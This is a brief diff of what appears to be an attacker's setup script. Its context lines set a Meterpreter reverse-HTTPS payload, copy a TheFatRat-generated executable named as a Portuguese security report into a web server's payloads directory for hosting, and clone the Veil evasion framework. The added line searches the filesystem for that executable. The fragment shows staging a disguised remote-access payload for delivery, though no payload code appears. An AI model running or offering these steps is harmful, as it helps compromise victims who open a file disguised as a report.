@@ -20,6 +20,7 @@ set PAYLOAD windows/x64/meterpreter/reverse_https
 mkdir /var/www/html/payloads
 cp /root/FatRat_Generated/relatorio_seguranca.exe /var/www/html/payloads/
 
+find / -name "relatorio_seguranca.exe" 2>/dev/null
 
 
 git clone https://github.com/Veil-Framework/Veil.git
